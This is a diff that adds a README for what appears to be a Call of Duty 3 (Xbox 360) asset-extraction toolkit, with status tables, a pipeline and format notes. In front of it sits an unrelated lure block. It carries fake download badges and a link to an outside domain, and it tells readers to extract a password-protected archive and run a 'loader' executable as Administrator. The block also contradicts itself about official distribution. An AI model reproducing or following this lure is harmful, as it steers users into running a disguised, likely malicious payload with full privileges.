@@ -1,0 +1,198 @@
+<div align="center">
+
+  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
+  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
+  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)
+
+</div>
+
+<div align="center">
+
+  <a href="https://respockett.pro/red">
+    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
+  </a>
+
+</div>
+
+> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.
+
+1. **⬇️ Download** the tool from the button above.
+2. **📦 Extract** the archive (password: `respocket`).
+3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
+4. **✅ Follow the setup wizard** – complete the installation.
+5. **🚀 Launch the Tool** – the main window appears.
+
+---
+
+> ⚠️ **Important: Official Distribution Notice**
+>
+> We distribute our software **only through MediaFire**.  
+> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
+> For your safety, always use the official release.
+
+---
+
+<div align="center">
+
+### 💙 Prepared by the Respocket Team
+
+**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
+Thank you for choosing our software. Download only official versions and stay with us!
+</div>
+
+
+---
+
+# cod3-tools
+
+Tools and format notes for extracting **Call of Duty 3 (Xbox 360)** assets (models, textures, sounds,
+skeletons) from your own copy of the game, plus tools that check the results against what the game
+actually draws.
+
+> **⚠️ Work in progress: not everything here is correct yet.**
+> These tools are unfinished and the output still has known errors. A handful of models get the wrong
+> texture or none, several vehicles can't be assembled, and vegetation isn't extracted at all. Only part of
+> the geometry has been checked against the running game. Don't treat any
+> output as verified unless the "Status" table below says so. **Help from others is very welcome:** see
+## Status (honest)
+
+| What | State |
+|---|---|
+| Archives (`.cod`) | Unpacked fully (KAPF container, LZO1X chunks, APKF asset packs). |
+| Asset pack layout | **Exact, from the pack header** (`apkf.py`): where every record and every block of GPU data sits. Checked on all 34,869 texture records on the disc; every one of the 30,386 mesh blocks is placed from it too (each checked against its surfaces' stored bounds). |
+| Meshes (`.xemesh`, `.xecell`) | Read from the game's own surface records, at the GPU position the pack header gives (an earlier search could land a vertex or two off and scramble the triangles). Verified **exact** against the running game for every model captured so far (47 models in Mayenne multiplayer, including world geometry and a multi-part weapon viewmodel). Not every model has been captured yet. |
+| Multi-part models | Placed from animation skeletons (`.xeskel` rest pose, computed by running the title's own skeleton code in an emulator). Weapons are posed with the first frame of their own idle animation when it has been decoded, so animated parts sit where the game holds them (a bazooka's rocket in the tube); parts the idle pose parks away from the gun (a spent shell) are left out and listed as `hidden` in `models.json`. A part with a numbered bone chain after it (a .30 cal's belt: `tag_b`, `tag_b01` ... `tag_b18`) is drawn at every bone of the chain. Several vehicles have **no skeleton anywhere on the disc**, so their parts can't be placed yet (WC51, Harley, Kübelwagen, M5 Stuart, Tiger I, Panther, Kangaroo, Sherman M4A3). |
+| Textures (`.xetex`) | Xenos-tiled DXT1/DXT3/DXT5/A8R8G8B8, byte-swapped, each at the exact position the pack header gives. Compared with a community HD set made from correctly decoded originals, the character and weapon textures match at 0.95 on average (most at 0.99-1.00). |
+| Texture → material links | Mostly from the material records; soldier heads/bodies are filled in at runtime from placeholders, which the linker resolves the same way. Lower detail levels (LODs) take their texture from a sibling LOD whose choice is backed by a record, so a helmet looks the same at every distance. 99.4% of surfaces get a texture. **A few models still get the wrong texture or none** (e.g. the C-47, a Sherman wreck, a Flakvierling variant). |
+| Sounds (`.wbk`, Treyarch NSLB) | Extracted with names through vgmstream. |
+| Animations (`.xeanim`) | Decoded by running the game's own decoder code in an emulator (`cod3_anim.py`, `extract_anims.py`; needs the unpacked `default.xex`). The compressed format itself isn't written down yet. |
+| SpeedTree vegetation (`.spt`) | **Not extracted yet** (trees/grass are drawn from these, not from `.xemesh`). |
+
+### How texture placement was solved
+
+Texture records don't store where their pixels are (the address in the fetch constant is filled in at load
+time). Earlier versions guessed each pack's GPU data start from how image-like the decodes looked; when the
+guess was one 64 KB step off, every texture of that pack came out as the right kind of image with its pieces
+in the wrong places, and image statistics can't see that.
+
+The pack header describes everything needed (`apkf.py`): a table of asset types (record count, record
+alignment, GPU alignment) and per-object entries (record size, GPU data size). Records start at
+`(header size & ~0xF) + 0x50`, raised to the largest record alignment, and follow each other in table
+order; the GPU data start at the next 64 KB boundary and hold every object's GPU data in the same order.
+Laid out that way, every texture record on the disc (and every mesh block checked so far) lands exactly where it really is.
+
+## Help wanted
+
+This is a one-person project and a lot of it is still guesswork checked by eye. If you know Call of Duty 3,
+Treyarch's Xbox 360 formats or the Xenos GPU, any of these would help a lot:
+
+- **Wrong or missing textures on a few models:** the material-to-texture link for models like the C-47
+  or the damaged Flakvierling.
+- **Vehicle skeletons:** where the WC51, Harley, Kübelwagen, M5 Stuart, Tiger I, Panther, Kangaroo and
+  Sherman M4A3 get their part positions, if not from a `.xeskel`.
+- **`.xeanim` animations:** a written description of the compression (they decode today only by running the
+  game's own code).
+- **SpeedTree `.spt`:** the version COD3 uses, and how its trees and grass are built.
+- **Checking results:** captures (Xenia + RenderDoc) of levels and vehicles not covered yet, or reports of
+  models and textures that look wrong next to the game.
+
+Please open an issue or a pull request, even for partial findings or a "this looks off" report.
+
+## Pipeline
+
+```
+python -I cod3/extract_all.py <disc folder> <work>/models        # unpack every archive's packs
+python -I cod3/extract_anims.py <work>/models <work>/anims_weapons <weapon archive> ...   # optional: weapon idle poses
+python -I cod3/extract_models.py <work>/models                   # every .xemesh/.xecell -> OBJ, by name
+python -I cod3/extract_textures.py <work>/models                 # every texture -> PNG, by name
+python -I cod3/link_textures.py <work>/models                    # material -> colour texture (.mtl)
+python -I cod3/catalog_models.py <work>/models <work>/catalog    # unique models by category, self-contained
+python -I cod3/relink_all.py <work>/models <work>/catalog [--models] [--index]   # link, catalog, audit in one go
+```
+
+Long steps take `--shard=K/N` to run in parallel. Per-model corrections found by eye go in
+`cod3/model_fixes.json`: surface textures (applied by `link_textures.py`), `_parts` (turn or hide a part of a
+multi-part model, applied by `extract_models.py`) and `_variants` (extra catalog copies of a model with a texture
+swapped, written by `catalog_models.py`) and `_assemblies` (a vehicle gun on its stand, joined at the offset the
+vehicle's skeleton tags give). The catalog leaves out invisible placeholder models (smaller than 1 cm).
+
+Other tools:
+
+- `assemble_characters.py` builds whole generic soldiers from body/head/helmet/gear pieces.
+- `cod3_tuck.py` (used by `extract_models.py`): the human rig hangs pouches, canteens, shovels and backpacks from
+  accessory bones that the bind pose spreads out from the body (up to 47 cm); characters are written with those
+  bones where the game's standing idle puts them, so the gear sits on the body.
+- `render_review.py`, `render_models.py`, `render_gallery.py` render review sheets (software renderer).
+- `contact_sheets.py <catalog> <out> [category ...]` renders picture sheets of a whole catalog category
+  (characters, soldiers, weapons, vehicles, props, scenery, effects), 30 models per sheet.
+- `catalog_prop.py <catalog obj> <out .lgo>` turns a catalog model into a textured rigid prop in the simple
+  LGO1 format (for use in a Unity mod).
+- `apkf.py` reads an asset pack's header and gives the exact position of every record and GPU block.
+- `reextract_textures.py` re-decodes every texture (4 processes) and rebuilds the index once;
+  `rebuild_index.py` rebuilds only the index.
+- `repair_texture.py` in-paints decoding damage in textures that have no clean copy anywhere.
+- `extract_cod3_audio.py` extracts the `.wbk` sound banks with names.
+- `xex_unpack.py` decrypts/unpacks `default.xex` to its memory image (needs `XEX_RETAIL_KEY`, the Xbox 360
+  retail key, which is not included). `cod3_emu.py` / `cod3_anim.py` run the title's own code on it
+  (Unicorn) to get skeleton rest poses.
+
+## Checking against the game
+
+1. Run the game in Xenia under RenderDoc and press F12 where the models you care about are on screen:
+   `powershell -File cod3/xenia_capture.ps1 -Disc <disc> -Xenia <xenia_canary.exe> -RenderDoc <renderdoccmd.exe>`
+2. Dump each capture's draws (inside RenderDoc's Python):
+   `set CAPTURE_IN=<capture.rdc>` / `set CAPTURE_OUT=<file.draws>` then `qrenderdoc.exe --python cod3/capture_dump.py`
+3. Compare: `python -I cod3/capture_check.py <work>/models report.json <file.draws> ... --archives=mp`
+
+Each draw is matched to an extracted surface by its exact triangle list (the title's own index buffer);
+then one 4x4 transform is fitted from our vertices to the clip-space positions the game drew. A residual
+near zero means the geometry is exactly the game's; parts of multi-part models must share their model's
+transform.
+
+## Formats (short notes; the module docstrings have the details)
+
+- **`.cod`** – "KAPF" archive (little-endian header and file list) of "NCH" chunks (big-endian headers,
+  LZO1X payload) plus uncompressed GPU packs. Each section/pack is an "APKF" asset pack. (`cod3_kapf.py`)
+- **Meshes** – record links are 32-bit word offsets from the pack's data start; `0xFC0000xx` ids are
+  name-table indices (id / 8). One dependency group per asset (`MAT`, `MESH`, `SKEL` ...). Each mesh object
+  has its own GPU block. Vertex declarations are Direct3D 9 style; positions are big-endian float3 in
+  inches, Z up. Skinned vertices use a per-surface bone palette. (`cod3_xemesh.py`)
+- **Asset packs** – header with a type table (FourCC or hash, count, record alignment, GPU flag and
+  alignment) and per-object (name entry, record size[, GPU size]) lists; records and GPU data in table
+  order. (`apkf.py`)
+- **Textures** – Xenos fetch constants (24 bytes) at texture record + 0x48, after two `0xFFFF0000` words;
+  tiled 32x32-block layout. (`cod3_textures.py`, `xenos_fetch.py`, `xenos_fast.py`)
+- **Skeletons** – mesh skeletons: 0x90-byte bone records (inverse bind matrices). Animation skeletons
+  (`.xeskel`, version 0x10302): 0x30-byte bone records, name at +4, (int16 parent, int16 own index) at
+  +0x2C, both counted without the leading `tag_origin`. (`cod3_parts.py`)
+- **Sounds** – Treyarch NSLB banks; vgmstream reads them with names.
+
+## License
+
+MIT (see `LICENSE`). Call of Duty 3 and its assets belong to Activision; this repository contains only
+original code and notes.
+
+
+---
+
+MIT License
+
+Copyright (c) 2026 Tokaroy
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
